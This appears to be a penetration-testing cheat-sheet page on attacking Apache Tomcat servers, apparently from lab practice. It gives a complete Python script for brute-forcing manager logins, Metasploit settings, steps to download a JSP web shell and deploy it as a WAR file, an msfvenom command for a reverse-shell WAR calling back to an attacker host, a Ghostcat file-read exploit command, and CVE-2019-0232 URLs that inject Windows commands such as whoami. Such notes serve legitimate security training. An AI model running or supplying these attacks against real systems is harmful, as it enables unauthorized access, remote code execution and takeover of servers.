# Tomcat

### Discovery/Footprinting

Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FU7PvTCaGWbizfC2C8mk2%2Fimage.png?alt=media&#x26;token=5a086977-1c90-499f-89c5-34ff083e2d7b" alt=""><figcaption></figcaption></figure>

Custom error pages may be in use that do not leak this version information. In this case, another method of detecting a Tomcat server and version is through the /docs page. This is the default documentation page, which may not be removed by administrators

```shellscript
curl -s <URL>/docs/ | grep Tomcat 
```

### Enumeration

After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager` and the `/host-manager` pages

We may be able to either log in to one of these using weak credentials such as `tomcat:tomcat`, `admin:admin`

```shellscript
# Brute force directories
gobuster dir -u <URL> -w <WORDLIST>
```

### Attacking

#### Login brute force

```shellscript
# Brute force with metasploit
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

Same with python

```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code

python3 mgr_brute.py -U <URL> -P /<LOGIN_PAGE> -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

#### WAR file upload

Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage

```shellscript
# Download a shell and zip it into the .war format
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```

Click `Browse`, upload the file ⇒ click `Deploy`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FuGMFZsh7Pm3CUU3Egcju%2Fimage.png?alt=media&#x26;token=4a3921cc-a6cb-4d40-9405-cbae9c5e77a2" alt=""><figcaption></figcaption></figure>

We should see a new entry

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FhcYkbc5SfuZtecxJtZ9h%2Fimage.png?alt=media&#x26;token=c5e8ede1-6443-4361-8ecd-e8b6c215c9eb" alt=""><figcaption></figcaption></figure>

Click on it ⇒ we get a 404 ⇒ we need to specify the cmd.jsp file in the URL

```shellscript
# Interact with the web shell
curl <URL>/backup/cmd.jsp?cmd=id
```

Or we could directly grab a reverse shell

```shellscript
# Generate the shell with msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4443 -f war > backup.war

# Upload the file as above and start a listener 
```

#### Leverage known vulnerabilities

**CVE-2020-1938 : Ghostcat**

All Tomcat versions before `9.0.31`, `8.5.51`, and `7.0.100` were found vulnerable

```shellscript
# PoC 
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

# Use the exploit => check the AJP13 port with nmap
python2.7 tomcat-ajp.lfi.py <URL> -p <AJP13_PORT> -f WEB-INF/web.xml
```

**CVE-2019-0232 : CGI**

`CVE-2019-0232` is a critical security issue that could result in remote code execution. This vulnerability affects <mark style="background-color:$danger;">Windows</mark> systems that have the `enableCmdLineArguments` feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected

```shellscript
# Fuzz for scripts .cmd or .bat as the vuln is for Windows systems
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<IP>:<PORT>/cgi/FUZZ.cmd
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<IP>:<PORT>/cgi/FUZZ.bat

# We can exploit by appending commands through the use of the batch command separator &
http://10.129.204.227:8080/cgi/welcome.bat?&dir

# If other commands don't work, check the environment variables and look for the 
# PATH_INFO variable => if it is empty, we need to pass the whole path to the command
http://10.129.204.227:8080/cgi/welcome.bat?&set

# Example
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

# If the above command encountered an error invalid character
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
